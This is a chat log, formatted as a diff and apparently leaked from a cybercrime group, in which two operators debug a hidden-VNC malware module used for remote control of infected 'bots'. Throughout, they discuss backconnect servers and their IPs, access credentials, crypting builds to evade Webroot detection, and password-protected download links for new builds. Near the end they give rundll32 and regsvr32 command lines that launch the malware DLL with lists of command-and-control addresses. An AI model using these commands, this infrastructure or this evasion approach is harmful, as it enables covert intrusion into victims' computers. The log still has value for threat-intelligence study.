@@ -1,0 +1,600 @@
+[12.08.21 18:23:14] angelo: hi
+[12.08.21 18:23:17] angelo: hi
+[12.08.21 18:23:24] angelo: are you a vntz bro?
+[12.08.21 18:23:29] grem: hi
+[12.08.21 18:23:32] grem: yeah.
+[12.08.21 18:23:38] angelo: Hammer was talking to you there
+[12.08.21 18:23:56] angelo: what we need is to understand the methodology of what's going on with the client
+[12.08.21 18:24:18] angelo: that's what I mean
+[12.08.21 18:24:27] angelo: ` look at last they put the vnts module in, there are modes, bot mode, user mode (how Timka is working, the Holder sees what you're doing). here's a bot mode for the injections test just right or a user mode when he is not at the computer. injections do not work when you start to climb, but in theory should work because you sit as a user `
+[12.08.21 18:24:44] angelo: maybe there's a real incompatibility
+[12.08.21 18:29:49] grem: I wrote back to jaime.
+I'll say it again
+```
+There, when you initialize the settings, you set the name of the environment variable
+Before the child process starts, an environment variable with the name specified at startup is created and deleted after startup
+```
+The name can be arbitrary, but until I got into this I put ip machine, cesar probably already changed this behavior
+[12.08.21 18:30:26] angelo: yeah, saw that
+[12.08.21 18:30:31] angelo: also passed it to heimi )
+[13.08.21 10:43:56] angelo: hi.
+[13.08.21 10:44:05] angelo: can you explain to the dumb ones how to run the module
+[13.08.21 10:44:15] angelo: in admin just a button vnts 2 ?
+[13.08.21 10:44:18] angelo: you push and ?
+[13.08.21 10:45:15] grem: hi.
+[13.08.21 10:45:40] grem: that's for adam and frank
+i don't have access to admin
+[20.08.21 13:39:54] angelo: hi
+[20.08.21 13:39:59] angelo: when you press get
+[20.08.21 13:40:02] angelo: appears
+[20.08.21 13:40:02] angelo: VNC:195.123.212.155:9093:KCj+6no7 Socks:195.123.212.155:9092:C4793B7A:EAFE2828
+[20.08.21 13:40:12] angelo: and the difference in what?
+[20.08.21 13:40:43] grem: hi.
+[20.08.21 13:41:21] grem: direct VNC connection and socket connection
+[20.08.21 13:41:53] angelo: so by connecting through VNC you stain your ip ?
+[20.08.21 13:42:02] grem: yes
+[20.08.21 13:42:02] angelo: it goes directly ?
+[20.08.21 13:42:07] angelo: Oh, man.
+[20.08.21 13:42:09] angelo: got it.
+[20.08.21 13:42:36] angelo: I wonder if vnts2 logs anything from client side
+[23.08.21 08:04:52] angelo: good morning !
+[23.08.21 08:05:06] angelo: no news on vnts ?
+[08.23.21 11:14:57] grem: hi.
+[23.08.21 11:15:09] grem: i don't think so
+[25.08.21 12:54:20] angelo: hi.
+[25.08.21 12:56:07] grem: hi
+[25.08.21 12:56:42] angelo: do you know what command to prescribe to VNC
+[25.08.21 12:56:48] angelo: to grant access
+[25.08.21 12:57:32] grem: access to what?
+[25.08.21 12:58:20] angelo: access to getlist
+[25.08.21 12:58:28] angelo: how to access it
+[25.08.21 12:59:10] grem: /api/online/list
+[25.08.21 12:59:45] grem: but it's not for the module, it's for the backconnect
+[25.08.21 12:59:54] angelo: um
+[25.08.21 13:00:01] angelo: doesn't look like a command for admin
+[25.08.21 13:00:12] angelo: ok
+[25.08.21 13:00:18] grem: this is the way
+[25.08.21 13:00:18] angelo: I'll run it again
+[25.08.21 13:02:00] grem: [HTTP API]
+To access the daemon the HTTP API at
+http://127.0.0.1:8081/
+
+Since there is no authorization, it is obligatory to use --local_admin=1, so no one from the Internet can access the API
+If you need access from the Internet, it is better to use proxying via nginx (to http://127.0.0.1:8081/) with added authorization (basic or cert).
+
+
+In case of error JSON is returned
+{"status": false, "error": "error information"}
+
+If successful, JSON is returned:
+{"status": true, ....}
+
+When requesting logs, if successful, the text of the log is returned immediately (without JSON)
+
+The following queries are supported:
+
+1) Restart the daemon
+POST /api/reboot
+reboot=1
+
+2) Getting statistics
+GET /api/stat/get
+
+3) Cleaning statistics
+POST /api/stat/clear
+clear=1
+
+4) Getting the config
+GET /api/config/get
+
+5) Installing the config
+POST /api/config/set
+	ping=Sec - how often to send ping to the bot
+	ping_limit=Sec - bot idle timeout (how many seconds to turn it off if there is no data from it). Preferably it should be = ping * 2 + 2
+	wait_bot=Sec - how long to wait for the connection of the bot after the client
+	established=Sec - timeout idle session between client and bot.
+	wait_client=Sec - timeout between client connection and receiving data from it
+
+6) Enable connection logging on socks and vnc
+POST /api/log/start
+	start=1
+	
+7) Disable connection logging on socks and vnc
+POST /api/log/stop
+	stop=1
+	
+8) Get the log of socks and vnc connections (if it was previously enabled)
+GET /api/log/get
+	
+	
+9) Get the system log (data in it will depend on the value of --loglevel)
+GET /api/syslog/get
+
+10) Get the online list
+GET /api/online/list
+[25.08.21 13:03:10] grem: is this needed?
+[25.08.21 13:03:50] angelo: that's a good question
+[25.08.21 13:03:56] angelo: see
+[25.08.21 13:03:59] angelo: we have admin
+[25.08.21 13:04:05] angelo: we run VNC module there
+[25.08.21 13:04:07] angelo: 2
+[25.08.21 13:04:50] angelo: then we have to get into the vnc list with access
+[25.08.21 13:04:55] angelo: that's how to do it ?
+[25.08.21 13:05:05] angelo: sorry I can describe not very correctly
+[25.08.21 13:05:13] angelo: not good with your technical stuff
+[25.08.21 13:06:25] grem: http://ip:9091/api/online/list - List for new module
+http://ip:8081/api/online/get - for old
+[25.08.21 13:07:03] grem: replace "ip" by ip in admin
+[25.08.21 13:08:34] angelo: so you have 5 minutes for me?!
+[25.08.21 13:08:43] grem: yes
+[25.08.21 13:08:44] angelo: here's the ip
+[25.08.21 13:08:45] angelo: 173.199.115.108
+[25.08.21 13:08:53] angelo: I ran VNC2 on it
+[25.08.21 13:09:00] angelo: how do I connect to it
+[25.08.21 13:09:04] angelo: by VNC
+[25.08.21 13:09:11] angelo: I know I'm dumb as hell
+[25.08.21 13:09:39] grem: you got a list with bot IDs and passwords?
+[25.08.21 13:09:56] angelo: http://195.123.212.155:8081/api/online/get
+[25.08.21 13:09:57] angelo: this ?
+[25.08.21 13:10:10] grem: that's the old one
+[25.08.21 13:10:29] angelo: http://195.123.212.155:9091/api/online/list this ?
+[25.08.21 13:10:34] angelo: others nt
+[25.08.21 13:10:41] grem: this one is new
+[25.08.21 13:11:02] angelo: like this
+[25.08.21 13:12:20] grem: in vnc you connect to 195.123.212.155:8083/195.123.212.155:8082 or 195.123.212.155:9093/195.123.212.155:9092
+and you enter the login and password to the bot you need
+[25.08.21 13:13:04] angelo: and where do I get the password and login?!
+[25.08.21 13:13:28] grem: http://195.123.212.155:8081/api/online/get
+http://195.123.212.155:9091/api/online/list
+[25.08.21 13:13:39] grem: everything should show up here
+[25.08.21 13:13:50] angelo: but if not ?
+[25.08.21 13:13:57] angelo: I'm searching by IP
+[25.08.21 13:14:13] grem: it means either the module didn't start, or the gasket is dead
+[25.08.21 13:14:32] angelo: ))))))))))))
+[25.08.21 13:14:41] angelo: but the client connects via vnts
+[25.08.21 13:14:47] angelo: to his bots
+[25.08.21 13:15:07] angelo: there's something wrong here
+[25.08.21 13:15:35] grem: in the new list made ID output
+[25.08.21 13:16:02] grem: the client is supposed to be guided by it
+[25.08.21 13:16:52] angelo: do you know what vnc3Dll is ?
+[25.08.21 13:16:59] angelo: the third one
+[25.08.21 13:17:02] grem: new module
+[25.08.21 13:17:07] angelo: shit
+[25.08.21 13:17:11] angelo: I thought 2 was new
+[25.08.21 13:17:22] grem: this is it for http://195.123.212.155:9091/api/online/list
+[25.08.21 13:17:46] angelo: so which one to start ?!) 2 or 3 ?!
+[25.08.21 13:17:53] grem: now 3
+[25.08.21 13:18:20] grem: 2 was temporary
+[25.08.21 13:18:31] angelo: ********************************************
+[25.08.21 13:18:35] angelo: there's a lot of dirty words
+[25.08.21 13:18:42] angelo: this is the first I've heard of it
+[25.08.21 13:35:33] angelo: so they launched vnts3
+[25.08.21 13:43:51] angelo: how to get on the list ?
+[25.08.21 13:44:03] grem: http://195.123.212.155:9091/api/online/list
+[25.08.21 13:45:00] angelo: and search by ip bot so ?!
+[25.08.21 13:45:04] angelo: and if it's not there
+[25.08.21 13:45:38] grem: and ID?
+[25.08.21 13:46:01] angelo: no
+[25.08.21 13:46:48] angelo: there are other ids
+[25.08.21 13:46:53] angelo: not like in admins
+[25.08.21 13:46:54] angelo: BF4B7DF0BB38BF8B7FC4BA4BB40F3E70
+[25.08.21 13:47:08] grem: ask cesar or adam
+[25.08.21 13:47:20] angelo: ok
+[25.08.21 20:33:12] angelo: do you know if vnts is broken again ?
+[25.08.21 20:33:29] angelo: no command
+[25.08.21 20:33:31] grem: don't know
+[25.08.21 20:33:35] angelo: but vnc2Dll start passes
+[25.08.21 20:33:44] angelo: nonsense ((
+[25.08.21 20:35:38] angelo: do you know the difference between 2 and 3 ?
+[25.08.21 20:36:50] grem: IDs are not output, there is no geoip support and the traffic between the module and backconnect is not encrypted
+[25.08.21 20:37:09] angelo: there is a coordinate difference
+[25.08.21 20:37:45] angelo: the second one can't be used at all, right?
+[25.08.21 20:39:02] grem: it is possible, I don't know for sure
+[25.08.21 20:40:38] angelo: got it
+[31.08.21 19:13:19] angelo: hey
+[31.08.21 19:13:23] angelo: I'm here for you
+[31.08.21 19:14:06] angelo: (12:12:05 PM) client: and vnts2 got green
+(12:12:16 PM) : the client in the browser end connection from note private
+[01.11.21 16:58:20] angelo: hi
+[01.11.21 16:58:21] angelo: here ?
+[01.11.21 17:05:19] grem: hi
+[01.11.21 17:05:37] angelo: hello
+[01.11.21 17:05:59] angelo: can you write how to start vnts in the new admin area now ?
+[01.11.21 17:07:02] grem: I have no access to admins, it's more likely to frank or adam
+[01.11.21 17:07:16] angelo: got it
+[05.11.21 15:00:51] angelo: hi
+[05.11.21 15:00:53] grem: hi.
+[05.11.21 15:01:01] angelo: looking for detects on vnts
+[05.11.21 15:01:18] angelo: which process/file is the user's VM sitting on ?
+[05.11.21 15:02:19] grem: rundll32 and dllhost
+but underneath them, it could be anything
+[05.11.21 15:03:20] angelo: D4A631B2B4BC41FB8EA2B680103EDE06D76706627883AFDB783E1445E47C366EB] [MD5: 18B68D5E7D021663C38F1509AE4777AB] [3/00080000]
+[W32.Trojan.Gen]
+Fri 2021-11-05 07:01:35.0255 Infection detected: C:\Users\Marcus81\AppData\Local\Temp\8717.dll [SHA256:
+
+D4A631B2B4BC1FB8EA2B680103EDE06D76706627883AFDB783E1445E47C366EB] [MD5: 18B68D5E7D021663C38F1509AE4777AB] [3/00080000]
+[W32.Trojan.Gen]
+Fri 2021-11-05 07:01:35.0495 Infection detected: C:\Users\Marcus81\AppData\Local\Temp\8717.dll [SHA256:
+
+D4A631B2B4BC1FB8EA2B680103EDE06D76706627883AFDB783E1445E47C366EB] [MD5: 18B68D5E7D021663C38F1509AE4777AB] [3/00080000]
+[W32.Trojan.Gen]
+[05.11.21 15:03:21] angelo: there are lines like this
+[05.11.21 15:05:07] grem: what should I do with it?
+[05.11.21 15:07:03] angelo: I don't know, I just had to send it to someone.)
+[05.11.21 15:07:05] angelo: ok thanks
+[05.11.21 15:07:11] angelo: I'll find out.
+[05.11.21 15:07:46] grem: ask in the crypto community
+or collin and elroy
+[05.11.21 15:11:13] grem: all I can say is that AB decided it's "probably a new trojan"
+[05.11.21 15:12:41] angelo: found by hash sum
+[05.11.21 15:12:41] angelo: yes detective VNC
+[09.11.21 07:23:19] angelo: Hi.
+[09.11.21 07:23:34] angelo: VNC detects on webroot
+[09.11.21 07:23:48] angelo: Silver said to clean
+[09.11.21 07:23:49] grem: with any crypto?
+[09.11.21 07:23:55] angelo: any
+[09.11.21 07:24:11] angelo: at least there were 3 of them and they all detected fine
+[09.11.21 07:24:27] angelo: and it is not clear why VNC sometimes is not loaded on weapon bots
+[09.11.21 07:24:34] angelo: no problems with bots
+[09.11.21 07:24:43] angelo: no detects, pads are working
+[09.11.21 07:25:11] grem: > and it is not clear why VNC sometimes does not load on combat bots
+in trik or bk?
+[09.11.21 07:25:12] angelo: checked yesterday on their machines all works fine, on the battle vnts does not start, that is not in the list vnts
+[09.11.21 07:25:16] angelo: uk
+[09.11.21 07:25:44] angelo: no obvious reasons, I don't know what's wrong with him
+[09.11.21 07:25:52] angelo: customers really need it
+[09.11.21 07:40:01] grem: does it crash on any specific OS?
+[09.11.21 07:40:32] angelo: a moment
+[09.11.21 07:43:23] angelo: 10
+[09.11.21 07:43:41] angelo: it seemed to always appear
+[09.11.21 07:44:13] grem: architecture and build?
+[09.11.21 07:44:24] angelo: 62
+[09.11.21 07:44:29] angelo: how to know what build?
+[09.11.21 07:45:00] angelo: VNCSRV_85158_1.dll
+[09.11.21 07:45:38] angelo: VNCSRV_86731_2.dll
+[09.11.21 07:50:38] grem: I meant the architecture and build of the windup
+x86/x86_64, 1607/20h2
+[09.11.21 07:51:54] angelo: 64
+[09.11.21 07:51:56] angelo: f,bkl
+[09.11.21 07:51:59] angelo: and build
+[09.11.21 07:53:06] angelo: OS : Windows 10
+Build 19041 : 4
+System Architecture 64
+[09.11.21 07:57:09] angelo: it worked just now
+[09.11.21 07:57:18] angelo: the problem is some kind of floating
+[09.11.21 08:00:02] grem: maybe 2004, but not for sure
+[09.11.21 08:00:13] grem: > Build 19041 : 4
+[09.11.21 08:00:41] angelo: I mean, this bug is floating and it's not bound to the axis build
+[09.11.21 08:00:48] angelo: I also start and stop
+[09.11.21 08:01:17] grem: and webroot detect in dynamics?
+[09.11.21 08:01:26] angelo: yes
+[09.11.21 08:01:38] angelo: static is clean as the first snow
+[09.11.21 08:04:29] grem: in cryptopanel vm can't run now?
+```
+Cryptopanel proxy https://195.123.209.112 is down, please call system administrator. Automatic tests are disabled.
+```
+[09.11.21 08:05:43] angelo: dunno
+[09.11.21 08:05:50] angelo: I always run it directly
+[09.11.21 08:05:55] angelo: it's okay Gatoru
+[09.11.21 08:05:58] angelo: gator
+[09.11.21 10:12:49] grem: I checked in static and dynamic, there is no webroot detection on the module itself.
+There are only on component parts for x86
+[09.11.21 10:14:38] grem: maybe it makes sense to use 64-bit module if the targets are 64-bit, at least in the trike the module is 64-bit
+[09.11.21 10:15:32] angelo: honestly, I don't know how the module gets started
+[09.11.21 10:15:51] angelo: on trik it's uploaded to the server, here it's hand-loaded
+[09.11.21 10:16:08] angelo: 64 bit targets
+[09.11.21 11:06:50] grem: Who shall I give the build to?
+You or collin?
+[09.11.21 11:13:45] angelo: no, I don't need it yet
+[09.11.21 11:13:48] angelo: give it to him
+[09.11.21 12:35:12] angelo: OS : Windows 10
+Build 19041 : 65
+System Architecture 64
+[09.11.21 12:36:26] grem: already passed it on
+[10.11.21 15:40:15] angelo: hi
+[10.11.21 15:40:16] angelo: tell me.
+[10.11.21 15:40:23] angelo: how does vnts work on gaskets ?
+[10.11.21 15:40:33] angelo: is there a possibility of breakdown on this part ?
+[10.11.21 15:40:44] angelo: if any gasket dies
+[10.11.21 15:40:48] angelo: I'm out of ideas
+[10.11.21 15:40:57] angelo: vntz needs a nosebleed
+[10.11.21 15:41:35] angelo: somewhere it starts, somewhere it does not, does it alternate them or what ?
+[10.11.21 15:42:00] grem: with last update pad list gets mixed up
+[10.11.21 15:42:46] grem: when a pad falls off, it should reconnect to another one
+[10.11.21 15:43:12] angelo: but when loading module it just takes the first one from the list ?
+[10.11.21 15:43:19] angelo: or initially random ?
+[10.11.21 15:43:41] grem: no, the list is shuffled, then the first from the list is taken
+[10.11.21 15:44:01] angelo: that is, as a variant can get on dead
+[10.11.21 15:44:07] grem: yes
+[10.11.21 15:44:25] angelo: is there any debugging atm ?
+[10.11.21 15:44:49] angelo: i have bots that won't work, and some that won't start, but will work with the next comda
+[10.11.21 15:44:56] angelo: something is wrong
+[10.11.21 15:45:12] grem: only if you build it with debugging, you can get connection statistics from the back
+[10.11.21 15:45:43] angelo: `you can also get connection statistics from the back
+[10.11.21 15:45:45] angelo: how ?
+[10.11.21 15:48:49] grem: on the page where you look at the list of clients change the address bar
+```
+/api/online/get
+```
+to
+```
+/api/stat/get
+```
+[10.11.21 15:49:27] grem: probably not much help though
+[10.11.21 15:50:17] angelo: yeah
+[10.11.21 15:50:30] angelo: you gotta get it down and figure out the random bug
+[10.11.21 15:50:38] angelo: otherwise robin's gonna get hurt
+[10.11.21 15:50:55] grem: `api/syslog/get` is still there
+[10.11.21 15:51:30] angelo: [17:20:19 20/08/2021] [INFO] MONITOR: New Log
+======================================================
+[17:20:19 20/08/2021] [INFO] MONITOR: Init...
+[17:20:19 20/08/2021] [INFO] MONITOR: Inited
+[17:20:19 20/08/2021] [INFO] SERVER: Init...
+[17:20:19 20/08/2021] [INFO] SERVER: Inited
+[17:20:19 20/08/2021] [INFO] SERVER: Wait Signal
+[3:15:09 10/09/2021] [WARNING] MONITOR: Other Signal=Terminated
+[3:15:09 10/09/2021] [INFO] MONITOR: Stopped
+[3:15:09 10/09/2021] [INFO] SERVER: _Server_WaitSignal -> sigwait=0
+[3:15:09 10/09/2021] [WARNING] SERVER: Signal=Terminated
+[3:15:09 10/09/2021] [INFO] SERVER: _Server_WaitSignal -> RetCode=242
+[3:15:09 10/09/2021] [INFO] SERVER: Stopped
+[13:10:23 10/09/2021] [INFO] MONITOR: New Log
+======================================================
+[13:10:23 10/09/2021] [INFO] MONITOR: Init...
+[13:10:23 10/09/2021] [INFO] MONITOR: Inited
+[13:10:23 10/09/2021] [INFO] SERVER: Init...
+[13:10:23 10/09/2021] [INFO] SERVER: Inited
+[13:10:23 10/09/2021] [INFO] SERVER: Wait Signal
+[10.11.21 15:51:48] angelo: so what is it ?
+[10.11.21 15:52:00] grem: nothing interesting
+[10.11.21 15:54:02] angelo: pads work like negroes, no detects, no failures uk gives no command
+[10.11.21 15:54:04] angelo: ideas ?
+[10.11.21 15:55:01] grem: nothing changes in the list of running processes ?
+[10.11.21 15:56:48] grem: no problems with clean module on test stands? or only crypts were tested?
+[10.11.21 15:57:55] angelo: only cryptos were tested
+[10.11.21 15:58:07] angelo: the same crypt goes on and off
+[10.11.21 15:58:20] angelo: better to test with logs
+[10.11.21 15:58:56] grem: you need to write down on paper what you're crypting with
+[10.11.21 15:59:23] angelo: i did it at 3 a.m. last night when everyone was already snoring
+[10.11.21 16:00:02] grem: because i had a krypt that crashed
+but that was probably a month and a half ago
+[10.11.21 16:00:30] angelo: the same crypt that crashes on my vm clean and works on combat ?
+[10.11.21 16:00:38] angelo: yeah
+[10.11.21 16:00:47] angelo: it either doesn't work or it works
+[10.11.21 16:03:21] grem: then tell me the name of the cryptor that vnc randomly runs on vm
+because this behavior was not reproduced with non-crypted module
+[10.11.21 16:04:32] angelo: carrol
+[10.11.21 16:04:46] angelo: even if it is lying
+[10.11.21 16:05:34] grem: no
+dll_bk_crypter9 etc.
+[10.11.21 16:06:30] angelo: he did it by hand that time
+[10.11.21 16:06:37] angelo: there is a crypt to breed
+[10.11.21 16:06:46] angelo: and that shit happened more than once
+[10.11.21 16:06:53] angelo: what starts or fails
+[10.11.21 16:28:13] grem: you need to find out for sure what kind of crypto it is, maybe it's about a specific crypto
+The module for trike has almost the same one, that's where the question is whether there's the same problem
+[10.11.21 16:30:07] angelo: no
+[10.11.21 16:30:12] angelo: no such thing there
+[10.11.21 16:30:43] grem: Module for Trick has practically the same code
+[10.11.21 16:31:33] angelo: that means something is wrong
+[10.11.21 16:31:37] angelo: you have to know what
+[10.11.21 17:05:46] angelo: can you give me a logged one ?
+[10.11.21 17:10:35] grem: yes
+[10.11.21 17:30:28] grem: ``
+Download: https://qaz.im/load/i6B8eT/4i7NDS
+Delete: https://qaz.im/index.php?a=delete&q=1934881863
+Password: Wn38%bD73Iy26$vA
+```
+[11.11.21 08:55:12] angelo: hello again
+[11.11.21 08:55:19] angelo: can heimi look at vntz ?
+[11.11.21 08:55:20] angelo: in gita
+[11.11.21 08:55:25] angelo: will you let me?
+[11.11.21 08:55:42] grem: no problem
+[11.11.21 08:55:50] angelo: thanks
+[11.11.21 08:56:03] angelo: what do i need for that ?
+[11.11.21 08:56:19] grem: his nickname in the git
+[11.11.21 08:56:29] angelo: sec
+[11.11.21 08:58:11] angelo: myla
+[11.11.21 09:02:39] grem: granted access
+[11.11.21 09:02:47] angelo: thanks !
+[11.11.21 09:03:31] angelo: is there a link ?
+[11.11.21 09:03:58] grem: trey/DarkCatVNC
+[11.11.21 09:04:49] angelo: it turns out there's even a name
+[11.11.21 09:05:35] grem: and logo, the pussycat appears when you connect
+[11.11.21 09:07:50] angelo: now I was surprised, I never paid attention
+[11.11.21 09:08:02] angelo: they like loud names
+[11.11.21 09:08:35] grem: I think it's a play on words BlackHat->DarkCat
+[11.11.21 10:10:01] angelo: alternatively
+[11.11.21 10:10:21] angelo: but I don't die hacks like to use black, dark and stuff like that
+[11.11.21 10:10:29] angelo: they lie to themselves )
+[11.11.21 10:10:36] angelo: tell me which folder to use for logs ?
+[11.11.21 10:10:39] angelo: TEMP ?
+[11.11.21 10:16:09] grem: yes, there logs are written to the file log.txt in the folder temp
+[11.11.21 10:16:34] grem: + you can see it via debugview
+[11.11.21 10:18:14] grem: > in the folder temp
+More precisely, the path from TMP/TEMP/USERPROFILE environment variables is taken there
+[11.11.21 10:18:53] angelo: more than understandable.)
+[11.11.21 10:18:55] angelo: thanks
+[11.11.21 11:06:50] angelo: question
+[11.11.21 11:06:57] angelo: made TEMP folder
+[11.11.21 11:07:02] angelo: started the module
+[11.11.21 11:07:27] angelo: and it didn't get into vnts list
+[11.11.21 11:07:43] angelo: no logs
+[11.11.21 11:07:59] angelo: or can I run it locally ?
+[11.11.21 11:08:37] grem: try to run locally
+[11.11.21 11:08:46] angelo: ok
+[11.11.21 11:08:49] angelo: tell me how
+[11.11.21 11:08:51] angelo: just in case
+[11.11.21 11:10:35] angelo: what is the entry point for the dll ?
+[11.11.21 11:10:50] grem: DllRegisterServer
+[11.11.21 11:17:26] angelo: silent
+[11.11.21 11:17:47] angelo: I can see my dll that was started by the bot
+[11.11.21 11:19:49] angelo: it is in progress
+[11.11.21 11:19:49] angelo: and was
+[11.11.21 11:20:00] grem: it's not starting at all?
+or what?
+[11.11.21 11:20:04] angelo: rundll32.exe C:\Users\Ted\AppData\Local\Temp\F6B1.dll,DllRegisterServer --id 1581690cc677a233cee75273fd7f725f --group 39 --ip 87.120.8.190,158.69.133.70,185.106.120.99,45.14.226.195,103.124.106.154,149.3.170.201,5.181.80.103,89.41.182.242,172.83.155.186,45.42.201.179,194.15.112.223
+[11.11.21 11:20:25] angelo: well, i sent you the process
+[11.11.21 11:20:30] angelo: working
+[11.11.21 11:23:04] angelo: vince alive
+[11.11.21 11:24:29] angelo: he appeared in the list, but there are no logs
+[11.11.21 11:27:14] angelo: rundll32.exe[INFO] vnc.Entry
+rundll32.exe[INFO] vnc.entry > runas VNC main
+rundll32.exe[INFO] vnc.bc.init > create work thread ok
+rundll32.exe[INFO] vnc.bc.work > start
+rundll32.exe[INFO] vnc.bc.connect > ip=45.14.226.195 port=9090
+rundll32.exe[INFO] vnc.bc.connect > ok
+rundll32.exe[INFO] vnc.bc.session > start
+rundll32.exe[INFO] vnc.bc.session > ping cmd timeout=60
+rundll32.exe[INFO] vnc.bc.session > send ping status=TRUE
+rundll32.exe[INFO] vnc.bc.session > ping cmd timeout=60
+rundll32.exe[INFO] vnc.bc.session > send ping status=TRUE
+rundll32.exe[INFO] vnc.bc.session > ping cmd timeout=60
+rundll32.exe[INFO] vnc.bc.session > send ping status=TRUE
+rundll32.exe[INFO] vnc.bc.session > ping cmd timeout=60
+rundll32.exe[INFO] vnc.bc.session > send ping status=TRUE
+rundll32.exe[INFO] vnc.bc.session > ping cmd timeout=60
+rundll32.exe[INFO] vnc.bc.session > send ping status=TRUE
+rundll32.exe[INFO] vnc.bc.session > ping cmd timeout=60
+[11.11.21 11:27:25] angelo: this log ?
+[11.11.21 11:27:33] grem: yes
+[11.11.21 11:28:02] angelo: yes, but it's not clear from which run, the bot or the hands
+[11.11.21 11:29:33] angelo: I'll try a new bot
+[11.11.21 11:51:42] angelo: new bot started right away
+[11.11.21 11:52:12] angelo: okay, I will leave for an hour and will try, I need to catch the moment when the module will not work
+[15.11.21 12:52:15] angelo: hello
+[15.11.21 12:52:22] grem: hi.
+[15.11.21 12:53:45] angelo: you wrote about the closed port
+[15.11.21 12:53:51] angelo: on the machine with the module ?
+[15.11.21 12:53:57] grem: yes
+[15.11.21 12:54:10] angelo: remind me the command
+[15.11.21 12:54:14] angelo: how to enter
+[15.11.21 12:54:54] angelo: netstat -a
+[15.11.21 12:54:55] angelo: ?
+[15.11.21 12:55:41] grem: just an unpopular port may be closed
+cesar's idea was to choose this port
+maybe for nothing
+[15.11.21 12:56:40] grem: > remind me please
+And here's fz.
+may be firewall settings closed, may be on the router
+[15.11.21 12:57:03] angelo: not sure, I caught the problem on VM
+[15.11.21 12:58:02] grem: then there is a possibility that a dead gasket is selected
+[15.11.21 12:58:12] angelo: checked, alive all (
+[15.11.21 12:58:41] angelo: at first i thought it was the problem, pinged on another port
+[15.11.21 12:58:43] angelo: but they're all alive
+[15.11.21 12:59:04] angelo: see what's the correlation, the tric is better than the vntz knock
+[15.11.21 12:59:09] angelo: and bk kuhezh
+[15.11.21 12:59:20] grem: jaime had a suggestion that it might be the blocking socket
+[15.11.21 13:00:56] grem: have you tried checking on different cryptos?
+And that one there is some kind of fixing solution with the network is used I think.
+[15.11.21 13:01:46] angelo: I tried one crypto but on 3-4 machines
+[15.11.21 13:01:53] angelo: and in one case vnts didn't work
+[15.11.21 13:02:18] angelo: i'm also blaming the gasket, but heimi checked through the gasket and everything worked (
+[15.11.21 16:10:02] grem: you want the assembly?
+[15.11.21 16:10:33] angelo: go ahead.
+[15.11.21 16:10:38] angelo: remind me what changes in it
+[15.11.21 16:10:54] angelo: what to watch
+[15.11.21 16:11:03] grem: just changed port to 80
+[15.11.21 16:11:23] grem: see if connection
+[15.11.21 16:11:48] grem: but need to get the pads set up
+[15.11.21 16:11:49] angelo: accepted
+[15.11.21 16:12:03] angelo: yeah, got it
+[15.11.21 16:12:17] angelo: and addresses are prescribed as ?
+[15.11.21 16:12:19] angelo: in modules ?
+[15.11.21 16:15:14] grem: addresses what ?
+[15.11.21 16:15:23] angelo: gaskets
+[15.11.21 16:15:40] grem: the old-fashioned way.
+[15.11.21 16:16:06] grem: command line everything
+[15.11.21 16:17:04] angelo: I'll text adam now
+[15.11.21 16:18:38] grem: ``
+Download: https://qaz.im/load/Hb2Tf3/kGzGS6
+Delete: https://qaz.im/index.php?a=delete&q=1446522853
+Password: c83%Bhj#94s38B1@
+```
+[26.11.21 20:17:14] angelo: Hello there ?
+[26.11.21 20:48:25] grem: hi
+[26.11.21 20:48:34] angelo: say
+[26.11.21 20:48:45] angelo: yes
+[26.11.21 20:48:46] angelo: much
+[26.11.21 20:48:52] angelo: tell me what port on VNC now ?
+[26.11.21 20:49:45] grem: the one I gave you is 80, so 9090 is used in prod now
+[26.11.21 20:50:01] angelo: so on 9090 it should work ?
+[26.11.21 20:50:13] angelo: we do not start vnts
+[26.11.21 20:50:28] angelo: shit
+[26.11.21 20:51:00] angelo: adam's burning in there
+[26.11.21 20:51:06] grem: test one too?
+[26.11.21 20:51:06] angelo: we can't leave here
+[26.11.21 20:51:18] angelo: test ?
+[26.11.21 20:51:25] angelo: we have vnts on the panel now
+[26.11.21 20:51:29] angelo: it used to start
+[26.11.21 20:51:31] angelo: not now
+[26.11.21 20:52:46] grem: what's the problem?
+[26.11.21 20:52:52] angelo: not clear
+[26.11.21 20:52:57] angelo: all gaskets are fresh
+[26.11.21 20:53:08] angelo: changed right now
+[26.11.21 20:55:36] grem: does bk not work?
+[26.11.21 20:55:59] angelo: it's bk now
+[26.11.21 20:56:05] angelo: no one touches bk
+[26.11.21 21 21:00:53] angelo: is there any other build ?
+[26.11.21 21:00:56] angelo: just in case
+[26.11.21 21:12:51] angelo: so, adam on Mon burning vntz in the morning
+[26.11.21 21:13:18] grem: in the next half an hour I'll give you the build
+[26.11.21 21:13:29] angelo: ok
+[26.11.21 21:13:31] angelo: thanks !
+[26.11.21 21:13:41] angelo: but exactly working ?)
+[26.11.21 21:14:43] angelo: can we do it on Mon?
+[26.11.21 21:14:59] angelo: everybody's so chipper, like not getting up in the morning ((
+[26.11.21 21:15:02] grem: who the hell knows?
+still need to test it
+[26.11.21 21:15:08] angelo: i understand
+[26.11.21 21:15:15] angelo: what time do you come?
+[26.11.21 21:15:16] angelo: usually
+[26.11.21 21:16:57] grem: usually at 10:12 a.m.
+And now after not much of a move I just got into a working rhythm today
+Couldn't get into work all week
+[26.11.21 21:17:17] angelo: you're not the only one, believe me
+[26.11.21 21:17:24] angelo: maybe on Mon?
+[26.11.21 21:17:39] angelo: I have to get up at 8:00 a.m.
+[26.11.21 21:17:42] angelo: if not before
+[26.11.21 21:18:19] angelo: come before 12:00]
+[26.11.21 21:18:22] angelo: Mon.
+[26.11.21 21:18:22] grem: I can give you the assembly now
+[26.11.21 21:18:29] angelo: ok
+[26.11.21 21:18:37] grem: just gonna fix a few things
+[26.11.21 21:36:06] angelo: I'm here if you need me
+[26.11.21 21:36:27] grem: ok
+[26.11.21 21:44:36] grem: ``
+Download: https://qaz.im/load/4StEsk/k2diar
+Delete: https://qaz.im/index.php?a=delete&q=918105370
+Password: iX47(bT38B1hW35#
+```
+[26.11.21 21:45:21] angelo: got it
+[26.11.21 21:45:23] angelo: thanks
+[26.11.21 21:45:29] angelo: check on weekend
+[26.11.21:46:22] grem: there are 2 main changes:
+port transfer with pad list
+and running via regsvr32 with parameters
+[26.11.21 21:47:19] angelo: got it
+[26.11.21 21:48:03] grem: I also removed check to get ip of the first network interface, maybe it's the reason, but signatures were changed a little, it can live a long time
+[26.11.21 21:48:31] angelo: wrote the words
+[26.11.21 21:51:12] grem: > port transmission with padding list
+that is you can enter 127.0.0.1:80,192.168.49.77:443 etc.
+>and run via regsvr32 with the parameters
+regsvr32 /i:"--id id --group group --ip 127.0.0.1:80,192.168.49.77:443" VNCSRV.dll
